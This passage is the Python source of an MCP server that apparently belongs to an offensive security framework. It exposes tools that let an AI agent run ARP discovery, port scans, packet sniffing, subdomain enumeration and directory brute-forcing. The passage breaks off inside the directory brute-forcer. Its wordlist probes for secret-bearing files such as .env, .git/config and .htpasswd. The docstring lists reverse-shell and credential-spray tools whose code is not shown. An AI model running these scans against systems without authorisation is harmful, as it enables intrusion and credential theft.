#!/usr/bin/env python3
"""
Ursa Minor — Recon & Scanning Toolkit
======================================
MCP server exposing network reconnaissance tools so Claude can run
scans directly from conversation.

Part of the Ursa offensive security framework by Bare Systems.

Tools:
  - discover_network: ARP scan to find all devices on the network
  - scan_ports:       Port scan a specific target
  - sniff_packets:    Capture and analyze network packets
  - full_recon:       Discover hosts + scan all their ports
  - lookup_service:   Identify what a port/service is
  - get_my_network_info: Get local network info
  - enumerate_subdomains: Find subdomains via CT + brute-force
  - probe_http:       Rich HTTP fingerprint (status, headers, TLS, title, methods)
  - dirbust:          Directory brute-forcing with robots/sitemap/crawl discovery
  - api_scan:         OpenAPI/Swagger spec discovery + endpoint + injection probing
  - tls_scan:         TLS certificate and cipher analysis
  - crack_hash:       Dictionary attack on password hashes
  - identify_hash:    Identify hash type
  - generate_reverse_shell: Generate reverse shell payloads
  - credential_spray: Brute-force credentials
  - vuln_scan:        Web vulnerability scanner (WSTG + ASVS-tagged findings)
  - os_fingerprint:   OS identification via TCP/IP analysis
  - smb_enum:         SMB share/version enumeration
  - snmp_scan:        SNMP device interrogation
  - detect_persistence: Scan common persistence locations for suspicious artifacts
  - create_baseline:  Save a defensive baseline snapshot of host state
  - baseline_diff:    Compare current host state against a named baseline
  - triage_host:      Run a lightweight host triage workflow
  - create_engagement: Define a pentest scope manifest (hosts, paths, approval gates)
  - check_scope:      Validate a URL against the active engagement scope
  - get_engagement:   Show the active engagement details
  - close_engagement: Close the active engagement
  - diff_scan_results: Regression diff — compare two saved scan results, report new/fixed findings

Run with:
    sudo ursa-minor mcp serve
"""

import io
import socket
import struct
import fcntl
from contextlib import redirect_stdout
from datetime import datetime
from typing import Any

try:
    from mcp.server.fastmcp import FastMCP
except ImportError:  # pragma: no cover - test fallback when MCP is absent
    class FastMCP:  # type: ignore[no-redef]
        def __init__(self, *_args, **_kwargs):
            pass

        def tool(self):
            def decorator(func):
                return func

            return decorator

        def run(self):
            raise RuntimeError("MCP runtime is not installed.")

try:
    from scapy.all import ARP, Ether, srp, IP, TCP, UDP, DNS, DNSQR, DNSRR, ICMP, Raw, conf  # type: ignore[attr-defined]
    from scapy.all import sniff as scapy_sniff, sr1

    conf.verb = 0
except ImportError:  # pragma: no cover - test fallback when Scapy is absent
    class _DummyConf:
        verb = 0
        iface = ""

    def _missing_scapy(*_args, **_kwargs):
        raise RuntimeError("Scapy is not installed.")

    class _ScapyLayer:
        def __init__(self, *_args, **_kwargs):
            _missing_scapy()

    ARP = Ether = IP = TCP = UDP = DNS = DNSQR = DNSRR = ICMP = Raw = _ScapyLayer  # type: ignore[assignment,misc]
    srp = scapy_sniff = sr1 = _missing_scapy
    conf = _DummyConf()  # type: ignore[assignment]

mcp_server = FastMCP(
    "ursa-minor",
    instructions="""Ursa Minor — the recon & scanning component of the Ursa framework.
    You have access to network reconnaissance, vulnerability scanning, credential
    testing, enumeration, and lightweight host-defense tools. Most tools require
    the server to be running with sudo for raw network access.""",
)


# ── Helpers ──


MAC_VENDORS = {
    "00:50:56": "VMware", "00:0c:29": "VMware", "08:00:27": "VirtualBox",
    "b8:27:eb": "Raspberry Pi", "dc:a6:32": "Raspberry Pi",
    "3c:22:fb": "Apple", "a4:83:e7": "Apple", "f8:ff:c2": "Apple",
    "ac:de:48": "Apple", "14:7d:da": "Apple", "88:e9:fe": "Apple",
    "d0:03:4b": "Apple", "a8:88:08": "Apple", "50:ed:3c": "Apple",
    "48:d7:05": "Apple", "8c:85:90": "Apple", "d8:30:62": "Apple",
    "34:36:3b": "Apple", "70:56:81": "Apple", "d4:61:9d": "Apple",
    "18:af:61": "Apple", "54:26:96": "Apple", "28:cf:da": "Apple",
    "00:17:f2": "Apple", "ac:87:a3": "Apple", "f0:18:98": "Apple",
    "70:3e:ac": "Apple", "c8:69:cd": "Apple", "80:e6:50": "Apple",
    "00:23:12": "Apple", "d0:4f:7e": "Apple", "60:f8:1d": "Apple",
    "90:72:40": "Samsung", "00:1a:8a": "Samsung", "ec:1f:72": "Samsung",
    "b4:79:a7": "Google", "f4:f5:d8": "Google", "54:60:09": "Google",
    "00:1a:6b": "Intel", "68:05:ca": "Intel", "3c:97:0e": "Intel",
    "00:e0:4c": "Realtek", "52:54:00": "QEMU/KVM",
    "b0:be:76": "TP-Link", "50:c7:bf": "TP-Link", "ec:08:6b": "TP-Link",
    "00:1e:58": "D-Link", "1c:7e:e5": "D-Link",
    "24:a4:3c": "Ubiquiti", "78:8a:20": "Ubiquiti",
    "20:a6:cd": "Netgear", "c4:04:15": "Netgear", "00:14:6c": "Netgear",
}

COMMON_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 111: "RPCbind", 135: "MS-RPC",
    139: "NetBIOS", 143: "IMAP", 443: "HTTPS", 445: "SMB",
    993: "IMAPS", 995: "POP3S", 1433: "MSSQL", 1521: "Oracle",
    3306: "MySQL", 3389: "RDP", 5432: "PostgreSQL", 5900: "VNC",
    6379: "Redis", 8080: "HTTP-Alt", 8443: "HTTPS-Alt", 8888: "HTTP-Alt",
    9090: "Web-Mgmt", 27017: "MongoDB",
}

TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 1723, 3306, 3389, 5432, 5900, 5901, 6379, 8080, 8443,
    8888, 9090, 27017, 3000, 5000, 8000, 4443, 9200, 10000,
]

QUICK_PORTS = [21, 22, 23, 25, 53, 80, 443, 445, 3306, 3389, 5432, 5900,
               6379, 8080, 8443, 8888, 9090, 27017, 5000, 8000]


def _get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    finally:
        s.close()


def _get_netmask(ifname="en0"):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        result = fcntl.ioctl(s.fileno(), 0xC0206919, struct.pack("256s", ifname.encode()))
        return socket.inet_ntoa(result[20:24])
    except Exception:
        return "255.255.255.0"


def _calculate_cidr(ip, netmask):
    ip_parts = [int(x) for x in ip.split(".")]
    mask_parts = [int(x) for x in netmask.split(".")]
    network = [ip_parts[i] & mask_parts[i] for i in range(4)]
    mask_int = sum(mask_parts[i] << (24 - 8 * i) for i in range(4))
    prefix_len = bin(mask_int).count("1")
    return f"{'.'.join(map(str, network))}/{prefix_len}"


def _get_network_range():
    local_ip = _get_local_ip()
    netmask = _get_netmask()
    return _calculate_cidr(local_ip, netmask), local_ip


def _lookup_vendor(mac):
    prefix = mac[:8].lower()
    return MAC_VENDORS.get(prefix, "Unknown")


def _grab_banner(ip, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, port))
        try:
            banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
        except socket.timeout:
            if port in (80, 8080, 8000, 8888, 443, 8443):
                s.send(b"HEAD / HTTP/1.1\r\nHost: target\r\n\r\n")
                banner = s.recv(1024).decode("utf-8", errors="ignore").strip()
                for line in banner.split("\r\n"):
                    if line.lower().startswith("server:"):
                        banner = line
                        break
            else:
                banner = ""
        s.close()
        return banner[:100] if banner else ""
    except Exception:
        return ""


def _tcp_connect_scan(ip, port, timeout=1):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except Exception:
        return False


# ── Auto-save helper ──


def _auto_save(tool_name: str, result: str, metadata: dict | None = None,
               structured_data: list | dict | None = None) -> str:
    """Save a scan result and append the result ID to the output.

    Also feeds the result into the normalized asset graph (Phase 6A) as facts.
    Both side effects are best-effort and never break the tool's own output.
    """
    try:
        from ursa_minor.results import save_result
        result_id = save_result(tool_name, result, metadata, structured_data)
        out = result + f"\n\n[Saved as {result_id}]"
    except Exception:
        out = result

    try:
        from ursa_minor.assetgraph import record_result
        record_result(tool_name, structured_data, metadata)
    except Exception:
        pass

    return out


# ── MCP Tools ──


@mcp_server.tool()
def discover_network(target_range: str | None = None, timeout: int = 3) -> str:
    """
    Discover all devices on the local network using ARP scanning.

    Sends ARP requests to find every device connected to the WiFi/LAN.
    Returns IP addresses, MAC addresses, and device vendors.

    Args:
        target_range: Network range in CIDR notation (e.g., "192.168.1.0/24").
                      If not provided, auto-detects your local network.
        timeout: Seconds to wait for responses (default 3).
    """
    local_ip = _get_local_ip()

    if not target_range:
        target_range, _ = _get_network_range()

    arp_request = ARP(pdst=target_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered, _ = srp(packet, timeout=timeout, retry=1)

    devices = []
    for sent, received in answered:
        vendor = _lookup_vendor(received.hwsrc)
        devices.append({
            "ip": received.psrc,
            "mac": received.hwsrc,
            "vendor": vendor,
        })

    if not devices:
        return "No devices found. Make sure the server is running with sudo."

    devices.sort(key=lambda d: [int(x) for x in d["ip"].split(".")])

    lines = [
        f"Network: {target_range}",
        f"Your IP: {local_ip}",
        f"Devices found: {len(devices)}",
        "",
        f"{'IP Address':<18} {'MAC Address':<20} {'Vendor':<15} Notes",
        "-" * 70,
    ]

    for d in devices:
        notes = ""
        if d["ip"] == local_ip:
            notes = "<-- YOU"
        elif d["ip"].endswith(".1"):
            notes = "<-- likely gateway"
        lines.append(f"{d['ip']:<18} {d['mac']:<20} {d['vendor']:<15} {notes}")

    result = "\n".join(lines)
    return _auto_save("discover_network", result,
                      {"target_range": target_range, "devices": len(devices)},
                      structured_data=devices)


@mcp_server.tool()
def scan_ports(
    target: str,
    ports: str | None = None,
    scan_all: bool = False,
    quick: bool = False,
    timeout: float = 1.0,
    threads: int = 100,
) -> str:
    """
    Scan open ports on a target IP address.

    Performs a TCP connect scan to find open services on the target.
    Includes banner grabbing to identify service versions.

    Args:
        target: Target IP address to scan.
        ports: Port specification — comma-separated or range
               (e.g., "22,80,443" or "1-1024"). If not provided,
               scans top ~100 common ports.
        scan_all: If True, scan all 65535 ports (slow).
        quick: If True, scan only top 20 ports (fast).
        timeout: Timeout per port in seconds (default 1.0).
        threads: Number of concurrent threads (default 100).
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    if ports:
        port_list: list[int] = []
        for part in ports.split(","):
            part = part.strip()
            if "-" in part:
                start, end = part.split("-", 1)
                port_list.extend(range(int(start), int(end) + 1))
            else:
                port_list.append(int(part))
        port_list = sorted(set(port_list))
    elif scan_all:
        port_list = list(range(1, 65536))
    elif quick:
        port_list = QUICK_PORTS
    else:
        port_list = TOP_PORTS

    start_time = datetime.now()
    open_ports = []

    def check_port(port):
        is_open = _tcp_connect_scan(target, port, timeout)
        return (port, is_open)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(check_port, p): p for p in port_list}
        for future in as_completed(futures):
            port, is_open = future.result()
            if is_open:
                service = COMMON_PORTS.get(port, "unknown")
                banner = _grab_banner(target, port)
                open_ports.append({
                    "port": port,
                    "service": service,
                    "banner": banner,
                })

    duration = (datetime.now() - start_time).total_seconds()
    open_ports.sort(key=lambda x: x["port"])

    lines = [
        f"Port Scan Results for {target}",
        f"Ports scanned: {len(port_list)}",
        f"Duration: {duration:.1f}s",
        "",
    ]

    if not open_ports:
        lines.append("No open ports found.")
        lines.append("Host may be down, all ports closed, or firewall blocking.")
    else:
        lines.append(f"{'Port':<8} {'Service':<15} {'Banner'}")
        lines.append("-" * 55)
        for p in open_ports:
            lines.append(f"{p['port']:<8} {p['service']:<15} {p['banner']}")
        lines.append(f"\n{len(open_ports)} open ports found")

    result = "\n".join(lines)
    return _auto_save("scan_ports", result,
                      {"target": target, "ports_scanned": len(port_list)},
                      structured_data=open_ports)


@mcp_server.tool()
def sniff_packets(
    count: int = 50,
    filter_expr: str | None = None,
    dns_only: bool = False,
    interface: str | None = None,
    timeout: int = 30,
) -> str:
    """
    Capture and analyze network packets.

    Sniffs live network traffic and returns a summary of captured packets
    including protocols, connections, and DNS queries.

    Args:
        count: Number of packets to capture (default 50, max 500).
        filter_expr: BPF filter expression, e.g.:
                     "tcp port 80" — HTTP traffic
                     "udp port 53" — DNS only
                     "host 192.168.1.1" — specific host
                     "not port 22" — exclude SSH
        dns_only: If True, only capture and report DNS queries.
        interface: Network interface to sniff on (default: auto).
        timeout: Max seconds to capture (default 30). Safety limit.
    """
    from collections import Counter

    count = min(count, 500)

    if dns_only and not filter_expr:
        filter_expr = "udp port 53"

    results: dict[str, Any] = {
        "packets": [],
        "dns_queries": [],
        "connections": set(),
        "stats": Counter(),
    }

    def process(pkt):
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            if pkt[DNS].qr == 0:
                query = pkt[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
                results["dns_queries"].append(query)
                results["stats"]["DNS"] += 1
            elif pkt[DNS].qr == 1 and pkt.haslayer(DNSRR):
                results["stats"]["DNS"] += 1

        if not pkt.haslayer(IP):
            if pkt.haslayer(ARP):
                results["stats"]["ARP"] += 1
            return

        ip = pkt[IP]

        if pkt.haslayer(TCP):
            results["stats"]["TCP"] += 1
            tcp = pkt[TCP]
            results["connections"].add(
                (ip.src, tcp.sport, ip.dst, tcp.dport)
            )
            service = COMMON_PORTS.get(tcp.dport, COMMON_PORTS.get(tcp.sport, ""))
            results["packets"].append(
                f"TCP  {ip.src}:{tcp.sport} -> {ip.dst}:{tcp.dport} {service}"
            )
        elif pkt.haslayer(UDP):
            results["stats"]["UDP"] += 1
            udp = pkt[UDP]
            results["packets"].append(
                f"UDP  {ip.src}:{udp.sport} -> {ip.dst}:{udp.dport}"
            )
        elif pkt.haslayer(ICMP):
            results["stats"]["ICMP"] += 1
            results["packets"].append(
                f"ICMP {ip.src} -> {ip.dst}"
            )

    try:
        scapy_sniff(
            iface=interface,
            filter=filter_expr,
            prn=process,
            count=count,
            store=False,
            timeout=timeout,
        )
    except PermissionError:
        return "Permission denied. The MCP server must be running with sudo."

    lines = [
        f"Packet Capture Summary",
        f"Captured: {sum(results['stats'].values())} packets",
        "",
    ]

    if results["stats"]:
        lines.append("Protocol Breakdown:")
        for proto, cnt in results["stats"].most_common():
            lines.append(f"  {proto:<8} {cnt}")
        lines.append("")

    if results["dns_queries"]:
        dns_counts = Counter(results["dns_queries"])
        lines.append(f"DNS Queries ({len(results['dns_queries'])} total):")
        for domain, cnt in dns_counts.most_common(20):
            lines.append(f"  {cnt:>4}x  {domain}")
        lines.append("")

    lines.append(f"Unique connections: {len(results['connections'])}")

    if not dns_only and results["packets"]:
        lines.append("")
        lines.append("Recent packets (last 30):")
        for pkt_line in results["packets"][-30:]:
            lines.append(f"  {pkt_line}")

    result = "\n".join(lines)
    sniff_data = {
        "packets": results["packets"][-50:],
        "dns_queries": results["dns_queries"],
        "connections": [list(c) for c in results["connections"]],
        "stats": dict(results["stats"]),
    }
    return _auto_save("sniff_packets", result,
                      {"filter": filter_expr, "count": count},
                      structured_data=sniff_data)


@mcp_server.tool()
def full_recon(
    target_range: str | None = None,
    quick: bool = True,
    threads: int = 50,
) -> str:
    """
    Run full network reconnaissance: discover hosts then scan all their ports.

    Phase 1: ARP scan to discover all live hosts.
    Phase 2: Port scan each discovered host.

    Returns a full report of the network's attack surface.

    Args:
        target_range: Network range in CIDR (e.g., "192.168.1.0/24").
                      Auto-detects if not provided.
        quick: If True, scan top 20 ports per host (faster).
                If False, scan top 100 ports (more thorough).
        threads: Threads per host for port scanning (default 50).
    """
    from concurrent.futures import ThreadPoolExecutor, as_completed

    local_ip = _get_local_ip()

    if not target_range:
        target_range, _ = _get_network_range()

    start_time = datetime.now()
    ports = QUICK_PORTS if quick else TOP_PORTS

    arp_request = ARP(pdst=target_range)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=3, retry=1)

    devices = []
    for sent, received in answered:
        devices.append({
            "ip": received.psrc,
            "mac": received.hwsrc,
            "vendor": _lookup_vendor(received.hwsrc),
        })

    if not devices:
        return "No hosts discovered. Make sure server is running with sudo."

    devices.sort(key=lambda d: [int(x) for x in d["ip"].split(".")])

    host_results = {}
    for device in devices:
        ip = device["ip"]
        if ip == local_ip:
            continue

        open_ports = []

        def check_port(port, _ip=ip):
            return (port, _tcp_connect_scan(_ip, port, timeout=1))

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_port, p): p for p in ports}
            for future in as_completed(futures):
                port, is_open = future.result()
                if is_open:
                    service = COMMON_PORTS.get(port, "unknown")
                    banner = _grab_banner(ip, port)
                    open_ports.append({
                        "port": port,
                        "service": service,
                        "banner": banner,
                    })

        open_ports.sort(key=lambda x: x["port"])
        host_results[ip] = {
            "mac": device["mac"],
            "vendor": device["vendor"],
            "open_ports": open_ports,
        }

    duration = (datetime.now() - start_time).total_seconds()

    lines = [
        "=" * 60,
        "URSA MINOR — NETWORK RECONNAISSANCE REPORT",
        "=" * 60,
        f"Target:   {target_range}",
        f"Your IP:  {local_ip}",
        f"Mode:     {'Quick' if quick else 'Standard'}",
        f"Duration: {duration:.1f}s",
        f"Hosts:    {len(devices)} discovered",
        "",
    ]

    total_open = 0
    for ip, data in sorted(host_results.items()):
        if not data["open_ports"]:
            lines.append(f"-- {ip} ({data['vendor']}) [{data['mac']}] — no open ports")
            continue

        total_open += len(data["open_ports"])
        lines.append(f"-- {ip} ({data['vendor']}) [{data['mac']}]")
        for p in data["open_ports"]:
            banner_info = f" — {p['banner']}" if p.get("banner") else ""
            lines.append(f"   {p['port']:<6} {p['service']:<15}{banner_info}")
        lines.append(f"   ({len(data['open_ports'])} open ports)")
        lines.append("")

    lines.append(f"Total: {len(devices)} hosts, {total_open} open ports")

    result = "\n".join(lines)
    return _auto_save("full_recon", result,
                      {"target_range": target_range, "hosts": len(devices), "open_ports": total_open},
                      structured_data=host_results)


@mcp_server.tool()
def lookup_service(port: int) -> str:
    """
    Look up what service typically runs on a given port number.

    Args:
        port: The port number to look up (1-65535).
    """
    service = COMMON_PORTS.get(port)
    if service:
        return f"Port {port}: {service}"

    try:
        name = socket.getservbyport(port)
        return f"Port {port}: {name} (from system services database)"
    except OSError:
        return f"Port {port}: No well-known service. Could be a custom application."


@mcp_server.tool()
def get_my_network_info() -> str:
    """
    Get info about your current network connection.

    Returns your local IP, network range, and gateway.
    """
    local_ip = _get_local_ip()
    netmask = _get_netmask()
    network = _calculate_cidr(local_ip, netmask)

    lines = [
        f"Local IP:  {local_ip}",
        f"Netmask:   {netmask}",
        f"Network:   {network}",
    ]

    try:
        import subprocess
        proc = subprocess.run(
            ["route", "-n", "get", "default"],
            capture_output=True, text=True, timeout=5,
        )
        for line in proc.stdout.splitlines():
            if "gateway" in line.lower():
                lines.append(f"Gateway:   {line.split(':')[-1].strip()}")
                break
    except Exception:
        pass

    result = "\n".join(lines)
    return _auto_save("get_my_network_info", result,
                      {"local_ip": local_ip, "network": network})


# ── Web Recon Tools ──


@mcp_server.tool()
def enumerate_subdomains(
    domain: str,
    ct_only: bool = False,
    threads: int = 50,
) -> str:
    """
    Discover subdomains of a target domain using DNS brute-force and
    Certificate Transparency logs.

    Finds hidden attack surface like dev.target.com, staging.target.com,
    admin.target.com that might be less secured than the main site.

    Args:
        domain: Target domain (e.g., "example.com")
        ct_only: If True, only use Certificate Transparency (passive, no
                 direct contact with target)
        threads: Number of concurrent DNS resolution threads (default 50)
    """
    import json as json_mod
    import urllib.request
    import urllib.error

    subdomain_words = [
        "dev", "development", "staging", "stage", "stg", "test", "testing",
        "qa", "uat", "sandbox", "demo", "beta", "alpha", "preview",
        "pre-prod", "preprod", "next",
        "api", "api2", "api-v2", "api-dev", "api-staging", "api-test",
        "app", "application", "web", "www", "www2", "www3",
        "mail", "email", "smtp", "pop", "imap", "webmail", "mx",
        "ftp", "sftp", "ssh", "vpn", "remote", "gateway", "gw",
        "proxy", "cdn", "cache", "edge", "lb",
        "ns", "ns1", "ns2", "ns3", "dns", "dns1", "dns2",
        "admin", "administrator", "panel", "portal", "manage", "management",
        "dashboard", "console", "control", "cp", "cpanel",
        "cms", "backend", "backoffice", "internal", "intranet",
        "db", "database", "mysql", "postgres", "mongo", "redis",
        "elastic", "elasticsearch", "kibana", "grafana", "prometheus",
        "jenkins", "ci", "cd", "gitlab", "git", "bitbucket",
        "jira", "confluence", "wiki", "docs", "documentation",
        "sentry", "monitor", "monitoring", "status", "health",
        "log", "logs", "logging",
        "files", "upload", "uploads", "media", "assets", "static",
        "storage", "s3", "backup", "backups", "archive",
        "auth", "login", "sso", "oauth", "identity", "id", "accounts",
        "chat", "blog", "news", "forum", "community", "support", "help",
        "cloud", "aws", "azure", "gcp",
        "shop", "store", "pay", "payment", "billing",
        "search", "analytics", "track", "tracking",
        "m", "mobile", "old", "new", "legacy", "v1", "v2", "v3",
        "lab", "labs", "research", "data",
        "crm", "erp", "hr", "corp", "corporate",
        "exchange", "autodiscover", "owa",
    ]

    all_subdomains = {}

    ct_subs = set()
    try:
        url = f"https://crt.sh/?q=%.{domain}&output=json"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=15) as response:
            data = json_mod.loads(response.read())
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.split("\n"):
                    sub = sub.strip().lower().lstrip("*.")
                    if sub and sub != domain and sub.endswith(f".{domain}"):
                        ct_subs.add(sub)
    except Exception:
        pass

    from concurrent.futures import ThreadPoolExecutor, as_completed as asc

    def resolve(fqdn):
        try:
            answers = socket.getaddrinfo(fqdn, None)
            ips = list(set(a[4][0] for a in answers))
            return fqdn, ips
        except Exception:
            return fqdn, None

    if ct_subs:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(resolve, sub): sub for sub in ct_subs}
            for f in asc(futures):
                sub, ips = f.result()
                if ips:
                    all_subdomains[sub] = ips

    if not ct_only:
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {}
            for word in subdomain_words:
                fqdn = f"{word}.{domain}"
                futures[executor.submit(resolve, fqdn)] = word

            for f in asc(futures):
                sub, ips = f.result()
                if ips:
                    all_subdomains[sub] = ips

    lines = [
        f"Subdomain Enumeration: {domain}",
        f"CT results: {len(ct_subs)} found",
        f"Total resolved: {len(all_subdomains)}",
        "",
    ]

    if not all_subdomains:
        lines.append("No subdomains found.")
    else:
        lines.append(f"{'Subdomain':<45} {'IP Address'}")
        lines.append("-" * 65)
        for sub, ips in sorted(all_subdomains.items()):
            lines.append(f"{sub:<45} {', '.join(ips)}")

        ip_to_subs: dict[str, list[str]] = {}
        for sub, ips in all_subdomains.items():
            for ip in ips:
                ip_to_subs.setdefault(ip, []).append(sub)
        shared = {ip: subs for ip, subs in ip_to_subs.items() if len(subs) > 1}
        if shared:
            lines.append("\nShared hosting detected:")
            for ip, subs in shared.items():
                lines.append(f"  {ip}: {', '.join(subs[:5])}")

    result = "\n".join(lines)
    sub_data = [{"subdomain": sub, "ips": ips} for sub, ips in sorted(all_subdomains.items())]
    return _auto_save("enumerate_subdomains", result,
                      {"domain": domain, "ct_only": ct_only, "found": len(all_subdomains)},
                      structured_data=sub_data)


@mcp_server.tool()
def dirbust(
    url: str,
    extensions: str | None = None,
    threads: int = 20,
    timeout: float = 5.0,
    wordlist_file: str | None = None,
    crawl: bool = True,
    auth_header: str | None = None,
    cookies: str | None = None,
) -> str:
    """
    Discover hidden files and directories on a web server by brute-forcing
    common paths. Finds admin panels, config files, backups, API docs, etc.

    Discovery sources (all automatic unless overridden):
    - Built-in wordlist (security-focused common paths)
    - External wordlist file (one path per line, via wordlist_file)
    - robots.txt / sitemap.xml path harvesting
    - Shallow HTML crawl of the root page (href/src endpoints)

    SPA/try_files false-positive detection: before scanning, a probe to a
    guaranteed-nonexistent path fingerprints the fallback body. Any 200
    response with a matching body hash is tagged [LIKELY_FP] and excluded
    from CRITICAL FINDINGS.

    If an active engagement is set, the request rate is automatically capped
    to the engagement's rate_limit_rps setting.

    Args:
        url: Target URL (e.g., "http://target.com")
        extensions: Comma-separated file extensions to try (e.g., "php,html,txt")
        threads: Concurrent request threads (default 20)
        timeout: Request timeout in seconds (default 5.0)
        wordlist_file: Path to an external wordlist file (one path per line).
                       Paths from this file are merged with the built-in list.
        crawl: If True (default), fetch robots.txt, sitemap.xml, and the root
               page and add discovered paths to the scan list.
        auth_header: Authorization header value for authenticated scanning
                     (e.g., "Bearer eyJ..." or "Basic dXNlcjpwYXNz").
        cookies: Cookie string for authenticated scanning
                 (e.g., "session=abc123; csrf=xyz").
    """
    import re as _re
    import urllib.request
    import urllib.error
    import urllib.parse

    _UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 ursa-minor/1"

    wordlist = [
        "admin", "login", "dashboard", "panel", "api", "api/v1", "api/v2",
        "api/docs", "swagger", "swagger.json", "graphql", "graphiql",
        "health", "status", "info", "version", "metrics",
        ".git", ".git/config", ".git/HEAD", ".env", ".env.local",
        "config", "config.php", "config.json", "settings",
        ".htaccess", ".htpasswd", "phpinfo.php", "wp-config.php",
        "backup", "backups", "backup.sql", "backup.zip", "db.sql",
        "uploads", "upload", "files", "media", "static",
        "tmp", "temp", "cache", "logs", "log",
        "robots.txt", "sitemap.xml", "security.txt",
        ".well-known/security.txt",
        "phpmyadmin", "adminer", "jenkins", "manager", "console",
        "test", "debug", "dev", "staging",
        "wp-admin", "wp-login.php", "wp-content", "wp-json",
        "wp-json/wp/v2/users", "xmlrpc.php",
        "server-status", "server-info",
        "user", "users", "account", "register",
        "docs", "documentation", "readme",
    ]

    discovery_notes: list[str] = []

    # ── External wordlist ────────────────────────────────────────────────────
    if wordlist_file:
        try:
            from pathlib import Path as _Path
            wl_path = _Path(wordlist_file).expanduser()
            extra = [
                line.strip().lstrip("/")
                for line in wl_path.read_text(errors="ignore").splitlines()
                if line.strip() and not line.startswith("#")
            ]
            wordlist = wordlist + extra
            discovery_notes.append(
                f"External wordlist: {wl_path.name} ({len(extra)} paths)"
            )
        except Exception as exc:
            discovery_notes.append(f"[WARN] Could not read wordlist_file: {exc}")

    # ── Engagement rate limiting ──────────────────────────────────────────────
    # If an active engagement is set, cap threads to its rate_limit_rps.
    # We use threads as a rough proxy: 1 thread ≈ 1 req/s at 1s timeout.
    _eng_rps_note: str = ""
    try:
        from ursa_minor.engagement import get_active as _get_active_eng
        _active_eng = _get_active_eng()
        if _active_eng:
            _eng_rps = _active_eng.get("rate_limit_rps", 0)
            if _eng_rps > 0 and threads > _eng_rps:
                threads = max(1, _eng_rps)
                _eng_rps_note = (
                    f"Threads capped to {threads} by engagement "
                    f"rate_limit_rps={_eng_rps}"
                )
    except Exception:
        pass

    # ── robots.txt / sitemap.xml harvesting ──────────────────────────────────
    def _fetch_text(path: str) -> str:
        try:
            req = urllib.request.Request(
                f"{url.rstrip('/')}/{path}", method="GET"
            )
            req.add_header("User-Agent", _UA)
            if auth_header:
                req.add_header("Authorization", auth_header)
            if cookies:
                req.add_header("Cookie", cookies)
            with urllib.request.urlopen(req, timeout=timeout) as r:
                if r.status == 200:
                    return r.read(65536).decode("utf-8", errors="ignore")
        except Exception:
            pass
        return ""

    def _parse_robots(text: str) -> list[str]:
        paths = []
        for line in text.splitlines():
            line = line.strip()
            if line.lower().startswith(("disallow:", "allow:")):
                _, _, val = line.partition(":")
                val = val.strip().split("?")[0].split("#")[0].strip().lstrip("/")
                if val and "*" not in val:
                    paths.append(val)
        return paths

    def _parse_sitemap(text: str) -> list[str]:
        paths = []
        for m in _re.finditer(r"<loc>\s*(https?://[^<]+?)\s*</loc>", text, _re.IGNORECASE):
            try:
                parsed = urllib.parse.urlparse(m.group(1))
                p = parsed.path.lstrip("/")
                if p:
                    paths.append(p)
            except Exception:
                pass
        return paths

    def _parse_html_links(html: str, base_url: str) -> list[str]:
        """Extract href/src values from root page, return as relative paths."""
        paths = []
        base_parsed = urllib.parse.urlparse(base_url)
        for m in _re.finditer(
            r'(?:href|src|action)\s*=\s*["\']([^"\'#?]{1,200})["\']',
            html, _re.IGNORECASE
        ):
            val = m.group(1).strip()
            if not val or val.startswith(("data:", "javascript:", "mailto:", "tel:")):
                continue
            try:
                joined = urllib.parse.urljoin(base_url, val)
                parsed = urllib.parse.urlparse(joined)
                # Only keep same-origin paths
                if parsed.netloc == base_parsed.netloc or not parsed.netloc:
                    p = parsed.path.lstrip("/")
                    if p:
                        paths.append(p)
            except Exception:
                pass
        return paths

    if crawl:
        robots_text = _fetch_text("robots.txt")
        if robots_text:
            rp = _parse_robots(robots_text)
            wordlist.extend(rp)
            discovery_notes.append(f"robots.txt: {len(rp)} paths harvested")

        sitemap_text = _fetch_text("sitemap.xml")
        if sitemap_text:
            sp = _parse_sitemap(sitemap_text)
            wordlist.extend(sp)
            discovery_notes.append(f"sitemap.xml: {len(sp)} paths harvested")

        root_html = _fetch_text("")
        if root_html:
            lp = _parse_html_links(root_html, url)
            wordlist.extend(lp)
            discovery_notes.append(f"Root page crawl: {len(lp)} link paths harvested")

    # ── Extension expansion ───────────────────────────────────────────────────
    base_wordlist = list(wordlist)
    paths = list(base_wordlist)
    if extensions:
        for word in base_wordlist:
            for ext in extensions.split(","):
                paths.append(f"{word}.{ext.strip()}")
    paths = list(dict.fromkeys(paths))  # deduplicate preserving order

    import hashlib as _hashlib

    show_codes = {200, 201, 204, 301, 302, 307, 308, 401, 403, 405, 500}
    results = []

    # ── SPA / try_files baseline fingerprinting ───────────────────────────────
    _spa_baseline_hash: str | None = None
    _spa_baseline_size: int | None = None
    try:
        _probe_url = f"{url.rstrip('/')}/____nonexistent_ursa_probe____"
        _probe_req = urllib.request.Request(_probe_url, method="GET")
